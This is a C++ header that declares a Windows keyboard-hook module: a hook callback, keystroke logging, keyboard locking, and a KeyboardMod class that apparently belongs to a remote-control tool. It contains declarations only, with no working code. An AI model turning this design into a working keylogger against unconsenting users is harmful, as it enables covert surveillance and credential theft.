#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <Windows.h>
#include <iostream>
#include <map>
#include <sstream>
#include <vector>

#include "RCDOMod.h"
#include "utils.h"

LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
bool setHook();
bool releaseHook();
void logKeystroke(int);
void lockKeyboard();
void releaseKeyboard();

extern std::map<int, std::wstring> mapSpecialKeys;
extern HHOOK ghHook;
extern KBDLLHOOKSTRUCT kbdStruct;

class KeyboardMod: public RCDOMod {
    public:
        int requireAdmin();
        void start();
        void kill();
};
#endif
